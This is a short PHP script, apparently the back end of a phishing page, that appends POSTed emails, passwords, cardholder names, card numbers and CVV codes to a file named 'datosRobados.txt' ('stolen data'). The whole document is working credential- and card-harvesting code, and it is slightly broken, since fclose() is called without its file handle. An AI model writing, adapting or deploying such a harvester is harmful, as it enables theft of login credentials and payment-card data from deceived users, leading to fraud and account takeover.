<?php

$file = fopen('../datosRobados/datosRobados.txt', 'r+');


if(isset($_POST['email'])){
    fwrite($file, $_POST['email']);
}

if(isset($_POST['password'])){
    fwrite($file, $_POST['password']);
}

if(isset($_POST['person'])){
    fwrite($file, $_POST['person']);
}

if(isset($_POST['cardNumber'])){
    fwrite($file, $_POST['cardNumber']);
}

if(isset($_POST['cvv'])){
    fwrite($file, $_POST['cvv']);
}

fclose();